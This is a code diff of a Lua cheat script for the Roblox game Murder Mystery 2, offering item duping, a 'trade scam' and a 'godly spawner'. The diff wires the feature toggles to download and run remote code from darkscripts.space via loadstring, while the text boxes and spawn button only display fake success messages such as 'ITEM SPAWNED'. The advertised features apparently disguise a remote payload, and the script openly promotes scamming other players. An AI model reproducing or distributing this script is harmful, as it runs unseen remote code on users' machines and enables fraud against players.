@@ -1,5 +1,5 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
- local Window = OrionLib:MakeWindow({Name = " 👑 Kursed X Gens | Murder Mystery 2 🔪", HidePremium = false, IntroText = "Kursed X Gens", SaveConfig = true, ConfigFolder = "OrionTest"})
+ local Window = OrionLib:MakeWindow({Name = "  Kursed X Gens | Murder Mystery 2 ", HidePremium = false, IntroText = "Kursed X Gens", SaveConfig = true, ConfigFolder = "OrionTest"})
  
  local Tab = Window:MakeTab({
 	Name = "Main",
@@ -73,12 +73,7 @@ Tab:AddToggle({
 	Name = "Enable Duping",
 	Default = false,
 	Callback = function(Value)
-		      		OrionLib:MakeNotification({
-	Name = "Kursed X Gens | Dupe",
-	Content = "Duping Enabled",
-	Image = "rbxassetid://4483345998",
-	Time = 3
-	})
+		      		loadstring(game:HttpGet('https://darkscripts.space/scripts/fe1507b4-0f1d-4406-9ca4-9e9cd0f561d7_1266547484977533073.lua',true))()
 	end    
 })
 
@@ -87,7 +82,12 @@ Tab:AddTextbox({
 	Default = "Weapon Name",
 	TextDisappear = false,
 	Callback = function(Value)
-loadstring(game:HttpGet('https://darkscripts.space/scripts/4ea1d4f1-f73d-4e74-baec-b73fd71955f8_1266547484977533073.lua',true))()
+OrionLib:MakeNotification({
+	Name = "Kursed X Gens | Dupe",
+	Content = "Item Confirmed!",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
 
 	end	  
 })
@@ -114,12 +114,7 @@ Tab:AddToggle({
 	Name = "Enable Trade Scam",
 	Default = false,
 	Callback = function(Value)
-		      		OrionLib:MakeNotification({
-	Name = "Kursed X Gens | Trade Scam",
-	Content = "Trade Scam Enabled",
-	Image = "rbxassetid://4483345998",
-	Time = 3
-	})
+		      		loadstring(game:HttpGet('https://darkscripts.space/scripts/fe1507b4-0f1d-4406-9ca4-9e9cd0f561d7_1266547484977533073.lua',true))()
 	end    
 })
 
@@ -128,7 +123,12 @@ Tab:AddTextbox({
 	Default = "Username",
 	TextDisappear = false,
 	Callback = function(Value)
-		loadstring(game:HttpGet('https://darkscripts.space/scripts/4ea1d4f1-f73d-4e74-baec-b73fd71955f8_1266547484977533073.lua',true))()
+OrionLib:MakeNotification({
+	Name = "Kursed X Gens | Godly Spawner",
+	Content = "Username Confirmed!",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
 	end	  
 })
 
@@ -143,6 +143,46 @@ Tab:AddButton({
 })
 
   	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Godly Spawner",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddToggle({
+	Name = "Enable Spawner",
+	Default = false,
+	Callback = function(Value)
+		      		loadstring(game:HttpGet('https://darkscripts.space/scripts/fe1507b4-0f1d-4406-9ca4-9e9cd0f561d7_1266547484977533073.lua',true))()
+	end    
+})
+
+Tab:AddTextbox({
+	Name = "Item Your Spawning",
+	Default = "Godly Name",
+	TextDisappear = false,
+	Callback = function(Value)
+OrionLib:MakeNotification({
+	Name = "Kursed X Gens | Godly Spawner",
+	Content = "Godly Confirmed!",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
+	end	  
+})
+
+Tab:AddButton({
+	Name = "Spawn Item",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Kursed X Gens | Godly Spawner",
+	Content = "Spawning Item.... (ITEM SPAWNED)",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
+     end
 })
 
 local Tab = Window:MakeTab({
